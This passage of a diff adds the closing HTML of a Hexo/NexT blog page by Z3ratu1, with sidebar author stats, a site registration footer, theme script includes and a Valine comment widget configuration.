class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">1.7.</span> <span class="nav-text">参考链接</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Z3ratu1" src="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+  <p class="site-author-name" itemprop="name">Z3ratu1</p>
+  <div class="site-description" itemprop="description">与其感慨路难行，不如现在出发</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">145</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">86</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="external nofollow noopener noreferrer" target="_blank">湘ICP备2020021580号 </a>
+      <img src="/./images/beian.png" style="display: inline-block;">
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Z3ratu1</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : '7H8kg0XdWO8IbhOcu4K1JaAT-gzGzoHsz',
+      appKey     : 'wPKQjkbVtvPaRR7gh2yjfLSi',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
